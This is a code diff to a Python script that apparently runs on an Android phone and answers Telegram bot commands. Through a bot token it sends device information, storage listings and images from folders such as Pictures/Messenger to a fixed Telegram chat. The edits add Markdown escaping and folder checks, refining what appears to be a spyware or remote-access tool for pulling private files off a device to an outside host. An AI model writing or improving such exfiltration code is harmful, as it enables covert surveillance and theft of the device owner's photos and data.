@@ -15,13 +15,19 @@ directories_to_search = [
     "/storage/emulated/0/Pictures/Messenger"
 ]
 
+# Function to escape special characters for Telegram Markdown
+def escape_markdown(text):
+    escape_chars = r'_*[]()~`>#+-=|{}.!'
+    return ''.join(['\\' + char if char in escape_chars else char for char in text])
+
 # Function to send message or document to Telegram
 def send_to_telegram(message, document=None):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    escaped_message = escape_markdown(message)
     data = {
         "chat_id": CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
+        "text": escaped_message,
+        "parse_mode": "MarkdownV2"
     }
     
     try:
@@ -42,11 +48,14 @@ def send_to_telegram(message, document=None):
 # Function to get storage file and folder list
 def get_storage_list(folder_path):
     try:
-        file_list = os.listdir(folder_path)
-        if file_list:
-            return file_list
+        if os.path.isdir(folder_path):
+            file_list = os.listdir(folder_path)
+            if file_list:
+                return file_list
+            else:
+                return "No files or folders found."
         else:
-            return "No files or folders found."
+            return f"`{folder_path}` is not a valid folder."
     except Exception as e:
         return f"Error getting file list: {str(e)}"
 
@@ -155,7 +164,7 @@ def handle_telegram_update(update):
                 elif message == '/device':
                     send_to_telegram(get_device_info())
                 elif message == '/sdcard':
-                    handle_folder_navigation("storage/emulated/0")
+                    send_to_telegram(get_storage_list(current_folder))
                 elif message == '/download_images':
                     send_to_telegram(download_and_send_images())
                 else:
